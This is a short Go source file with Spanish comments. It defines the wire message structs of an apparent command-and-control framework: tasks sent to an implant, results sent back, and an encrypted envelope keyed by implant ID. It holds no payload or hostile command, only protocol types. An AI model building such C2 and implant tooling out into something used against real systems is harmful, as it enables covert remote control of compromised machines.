package protocol

// TaskWire es la tarea tal y como viaja por el cable dentro del payload
// cifrado de MsgTaskDispatch. Minimal a propósito: no expone al implante
// metadatos internos (operator_id, status, output previo, timestamps).
type TaskWire struct {
	ID      string   `json:"id"`
	Command string   `json:"command"`
	Args    []string `json:"args"`
}

// TaskResultWire es el resultado de una tarea enviado por el implante al C2.
// Output viaja como base64 (encoding por defecto de []byte en encoding/json).
type TaskResultWire struct {
	TaskID string `json:"task_id"`
	Output []byte `json:"output"`
	Error  string `json:"error"`
}

// EncryptedWrapper es el sobre para todos los mensajes cifrados.
// El server lee ImplantID para localizar la sesión y descifrar Data.
type EncryptedWrapper struct {
	ImplantID string `json:"implant_id"`
	Data      []byte `json:"data"`
}
